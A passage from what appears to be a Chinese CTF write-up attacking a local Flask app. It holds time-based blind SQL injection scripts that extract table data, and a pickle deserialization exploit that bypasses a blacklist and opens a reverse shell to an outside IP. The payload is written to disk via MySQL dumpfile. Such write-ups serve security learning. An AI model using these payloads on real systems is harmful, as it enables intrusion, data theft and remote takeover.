1' and if((select length(column_name) from information_schema.columns where table_schema='flask' and table_name='user' limit 0,1)=3, sleep(10), 1),'1','2018-09-12')#
```

python脚本
```
import requests
from lxml import etree
import time


burp1_url = "http://127.0.0.1:83/index"
burp1_cookies = {"session": "e778b19f-811d-47c7-81b5-9465245fc97a"}
burp1_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Referer": "http://127.0.0.1:83/index", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
mess_content = requests.get(burp1_url, headers=burp1_headers, cookies=burp1_cookies)


html = etree.HTML(mess_content.text)
html_data = html.xpath('//*[@id="csrf_token"]')

token = html_data[0].get('value')


for i in range(0, 6):

    for j in range(1, 20):

        time_start = time.time()

        burp0_data = {
            "csrf_token": token,
            "post": "1' and if((select length(column_name) from information_schema.columns where table_schema='flask' and table_name='user' limit {index},1)={num}, sleep(10), 1),'1','2018-09-12')#".format(index=i, num=j),
            "submit": "Submit"}

        response =requests.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp0_data)

        time_end = time.time()

        if time_end-time_start > 10:
            print(j)
            break
```

![](README/luffy29%202.png)

8. 判断列的名字
```
1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='flask' and table_name='user' limit 0,1),1,1))=1, sleep(10), 1),'1','2018-09-12')#
```


```
import requests
from lxml import etree
import time


burp1_url = "http://127.0.0.1:83/index"
burp1_cookies = {"session": "e778b19f-811d-47c7-81b5-9465245fc97a"}
burp1_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Referer": "http://127.0.0.1:83/index", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
mess_content = requests.get(burp1_url, headers=burp1_headers, cookies=burp1_cookies)


html = etree.HTML(mess_content.text)
html_data = html.xpath('//*[@id="csrf_token"]')

token = html_data[0].get('value')


for i in range(1, 9):

    for j in range(32, 127):

        time_start = time.time()

        burp0_data = {
            "csrf_token": token,
            "post": "1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='flask' and table_name='user' limit 1,1),{index},1))={num}, sleep(10), 1),'1','2018-09-12')#".format(index=i, num=j),
            "submit": "Submit"}

        response =requests.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp0_data)

        time_end = time.time()

        if time_end-time_start > 10:
            print(chr(j))
            break
```


![](README/luffy30%202.png)


9. 判断字段长度
```
1' and if((select length(username) from user limit 0,1)=3, sleep(10), 1),'1','2018-09-12')#
```

```
import requests
from lxml import etree
import time


burp1_url = "http://127.0.0.1:83/index"
burp1_cookies = {"session": "e778b19f-811d-47c7-81b5-9465245fc97a"}
burp1_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Referer": "http://127.0.0.1:83/index", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
mess_content = requests.get(burp1_url, headers=burp1_headers, cookies=burp1_cookies)


html = etree.HTML(mess_content.text)
html_data = html.xpath('//*[@id="csrf_token"]')

token = html_data[0].get('value')


for i in range(1, 10):

    for j in range(1, 2):

        time_start = time.time()

        burp0_data = {
            "csrf_token": token,
            "post": "1' and if((select length(username) from user limit 0,1)={num}, sleep(10), 1),'1','2018-09-12')#".format(num=i),
            "submit": "Submit"}

        response =requests.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp0_data)

        time_end = time.time()

        if time_end-time_start > 10:
            print(i)
            break
```


10. 判断内容
```
1' and if(ascii(substr((select username from user limit 0,1),1,1))=34,sleep(10),1),'1','2018-09-12')#
```

```
import requests
from lxml import etree
import time


burp1_url = "http://127.0.0.1:83/index"
burp1_cookies = {"session": "e778b19f-811d-47c7-81b5-9465245fc97a"}
burp1_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Referer": "http://127.0.0.1:83/index", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
mess_content = requests.get(burp1_url, headers=burp1_headers, cookies=burp1_cookies)


html = etree.HTML(mess_content.text)
html_data = html.xpath('//*[@id="csrf_token"]')

token = html_data[0].get('value')


for i in range(1, 10):

    for j in range(32, 127):

        time_start = time.time()

        burp0_data = {
            "csrf_token": token,
            "post": "1' and if(ascii(substr((select username from user limit 0,1),{index},1))={num},sleep(10),1),'1','2018-09-12')#".format(index=i, num=j),
            "submit": "Submit"}

        response =requests.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp0_data)

        time_end = time.time()

        if time_end-time_start > 10:
            print(chr(j))
            break
```

![](README/luffy32%202.png)

第二题: python反序列化漏洞

前文提到反序列化的漏洞是pickle的是load,loads和类Unpickler
在others.py中引用了pickle的Unpickler类

![](README/luffy33.png)
并在该文件的154行定义了一个load函数
![](README/luffy34.png)

追踪了一下该函数轨迹
在mycache.py中有三个函数调用了该函数
第115行的
```
    def _prune(self):
        entries = self._list_dir()
        if len(entries) > self._threshold:
            now = time()
            for idx, fname in enumerate(entries):
                try:
                    remove = False
                    with open(fname, 'rb') as f:
                        expires = load(f)
                    remove = (expires != 0 and expires <= now) or idx % 3 == 0

                    if remove:
                        os.remove(fname)
                except (IOError, OSError):
                    pass

```

第134行的
```

    def get(self, key):
        filename = self._get_filename(key)
        try:
            with open(filename, 'rb') as f:
                pickle_time = load(f)
                if pickle_time == 0 or pickle_time >= time():
                    a = load(f)
                    return a
                else:
                    os.remove(filename)
                    return None
        except (IOError, OSError, PickleError):
            return None
```


第182行的
```
   def has(self, key):
        filename = self._get_filename(key)
        try:
            with open(filename, 'rb') as f:
                pickle_time = load(f)
                if pickle_time == 0 or pickle_time >= time():
                    return True
                else:
                    os.remove(filename)
                    return False
        except (IOError, OSError, PickleError):
            return False
```

这其中get参数可以外部调用
![](README/luffy35.png)

追踪了一下get读取的文件参数
```
    def get(self, key):
        filename = self._get_filename(key)
        try:
            with open(filename, 'rb') as f:
                pickle_time = load(f)
                if pickle_time == 0 or pickle_time >= time():
                    a = load(f)
                    return a
                else:
                    os.remove(filename)
                    return None
        except (IOError, OSError, PickleError):
            return None
```
_get_filename的函数原型
```
    def _get_filename(self, key):

        if isinstance(key, text_type):
            key = key.encode('utf-8')  # XXX unicode review
        hash = md5(key).hexdigest()

        print(key, hash)

        return os.path.join(self._path, hash)
```
我多加了一句发现文件名key是"bdwsessions"+sessionid的形式,hash就是将以上字符串md5化

![](README/luffy36.png)

![](README/luffy37.png)

文件名有了，然后就是文件路径self.path来自于
```
class FileSystemCache(BaseCache):
    _fs_transaction_suffix = '.cache'

    def __init__(self, cache_dir, threshold=500, default_timeout=300,
                 mode=0o600):
        BaseCache.__init__(self, default_timeout)
        self._path = cache_dir
        self._threshold = threshold
        self._mode = mode

```

```

class FileSystemSessionInterface(SessionInterface):
    session_class = FileSystemSession

    def __init__(self, cache_dir, threshold, mode, key_prefix="bdwsessions",
                 use_signer=False, permanent=True):

        self.cache = FileSystemCache(cache_dir, threshold=threshold, mode=mode)
```

```
app.session_interface = FileSystemSessionInterface(
    app.config['SESSION_FILE_DIR'], app.config['SESSION_FILE_THRESHOLD'],
    app.config['SESSION_FILE_MODE'])
```

```
SESSION_FILE_THRESHOLD = 10000
SESSION_FILE_DIR = "/tmp/ffff"
SESSION_FILE_MODE = 0660
SESSION_PERMANENT = True
```

路径是在/tmp/ffff目录下

这样的话我们只需要将反弹shell的反序列化的文件写到/tmp/ffff下，然后就能用session触发，问题是怎么写，那就只能用mysql了
我把session取出来6e19902f-da54-4c61-8533-41e595d9b638改成6e19902f-da54-4c61-1984-41e595d9b638
然后加上前缀md5化
```
from hashlib import md5

def _get_filename(key):
    if isinstance(key, str):
        key = key.encode('utf-8')  # XXX unicode review
    hash = md5(key).hexdigest()

    print(key, hash)


if __name__ == '__main__':
    _get_filename("bdwsessions6e19902f-da54-4c61-1984-41e595d9b638")

#'bdwsessions6e19902f-da54-4c61-1984-41e595d9b638', 'b8f64e2650ca3a8c30146ff3019e9948'

```

 制作反序列化代码
由于网站带了一个黑名单
```
black_type_list = [eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen,
                   tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link,
                   lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs,
                   rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv,
                   execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe,
                   spawnv, spawnve, spawnvp, spawnvpe, load, loads]
```

利用commands.getoutput可绕过

```
import pickle
import commands

class exp(object):
    def __reduce__(self):

        s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.168.46.145",6080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
        return (commands.getoutput, (s,))

e = exp()

pick = open("shadow", "wb")

s = pickle.dump(e, pick)
```

将生成的shadow利用mysql进行16进制转换

```
select hex(load_file("/tmp/shadow"));
```

![](README/0746C3E0-21FD-4E85-B9BE-1D1B1F571ABF.png)

导出的语句如下
```
select/**/0x63636F6D6D616E64730A6765746F75747075740A70300A285327707974686F6E202D63205C27696D706F727420736F636B65742C73756270726F636573732C6F733B733D736F636B65742E736F636B657428736F636B65742E41465F494E45542C736F636B65742E534F434B5F53545245414D293B732E636F6E6E6563742828223137322E3136382E34362E313435222C3630383029293B6F732E6475703228732E66696C656E6F28292C30293B206F732E6475703228732E66696C656E6F28292C31293B206F732E6475703228732E66696C656E6F28292C32293B703D73756270726F636573732E63616C6C285B222F62696E2F62617368222C222D69225D293B5C27270A70310A7470320A5270330A2E/**/into/**/dumpfile/**/'/tmp/ffff/b8f64e2650ca3a8c30146ff3019e9948';
```

还是用之前post的注入点，组合之后就是
```
luffy','1','2018-09-12');select/**/0x63636F6D6D616E64730A6765746F75747075740A70300A285327707974686F6E202D63205C27696D706F727420736F636B65742C73756270726F636573732C6F733B733D736F636B65742E736F636B657428736F636B65742E41465F494E45542C736F636B65742E534F434B5F53545245414D293B732E636F6E6E6563742828223137322E3136382E34362E313435222C3630383029293B6F732E6475703228732E66696C656E6F28292C30293B206F732E6475703228732E66696C656E6F28292C31293B206F732E6475703228732E66696C656E6F28292C32293B703D73756270726F636573732E63616C6C285B222F62696E2F62617368222C222D69225D293B5C27270A70310A7470320A5270330A2E/**/into/**/dumpfile/**/'/tmp/ffff/b8f64e2650ca3a8c30146ff3019e9948'#
```

然后本地监听6080端口,用burp篡改session为6e19902f-da54-4c61-1984-41e595d9b638
![](README/DC4C17E8-D0F2-4606-B0C0-AD00B03520BF.png)


socat即可返回信息
![](README/A9DC4DD4-B4D7-40E2-AB88-1BCACDE2B1E0.png)


[Python Pickle的任意代码执行漏洞实践和Payload构造](http://www.polaris-lab.com/index.php/archives/178/)

[Python反序列化漏洞的花式利用](http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/)

[Pickle 反序列化漏洞](https://www.jianshu.com/p/8fd3de5b4843)

[利用DNSlog回显Weblogic(CVE-2017-10271) 漏洞执行命令结果](http://www.freebuf.com/column/158579.html)

[HITBCTF 2018](http://www.cnblogs.com/wfzWebSecuity/p/9401677.html)

[Python反序列化安全问题](https://segmentfault.com/a/1190000013099825)
